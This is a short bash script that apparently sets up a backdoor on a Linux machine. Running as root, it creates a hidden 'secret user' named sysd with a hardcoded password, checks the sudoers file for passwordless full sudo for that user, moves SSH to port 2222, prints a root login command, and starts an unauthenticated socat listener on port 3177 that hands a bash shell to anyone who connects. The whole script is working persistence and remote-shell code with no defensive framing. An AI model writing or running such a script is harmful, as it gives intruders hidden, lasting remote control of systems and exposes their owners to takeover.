#!/usr/bin/env bash

# Ensure the script is run with root privileges
if [ "$EUID" -ne 0 ]; then
    echo "Please run as root."
    exit 1
fi

echo "Script running..."

# Create a system user with specified UID and no home directory
useradd -rMo -u 300 -p p4ssw0rd sysd

# Assign the user to a group with the same GID
groupmod -g 300 sysd
echo "Created secret user."

# Verify if the user was created
grep -i sysd /etc/passwd

# Check if the sudoers file is properly configured for the sysd user
if ! grep -q 'sysd ALL=(ALL) NOPASSWD:ALL' /etc/sudoers; then
    echo "Error: sudoers file not properly configured. Please fix it!"
    exit 1
else
    echo "sudoers check complete."
fi

# Stop the SSH service if it's running
if systemctl is-active --quiet ssh.service; then
    echo "SSH service is running. Shutting it down..."
    systemctl stop ssh.service
fi

echo "Modifying SSH configuration..."

# Change SSH port in the config file
sed -i 's/#Port 22/Port 2222/g' /etc/ssh/sshd_config

# Restart the SSH service
systemctl restart ssh.service
echo "SSH service restarted."

TARGET_IP=$(hostname -I | awk '{print $1}')
echo "SSH command: ssh root@$TARGET_IP -p 2222"

# Install socat
apt-get install socat -y

# Run socat listener in background
socat TCP4-LISTEN:3177,fork EXEC:/bin/bash &

echo "Listener setup complete."
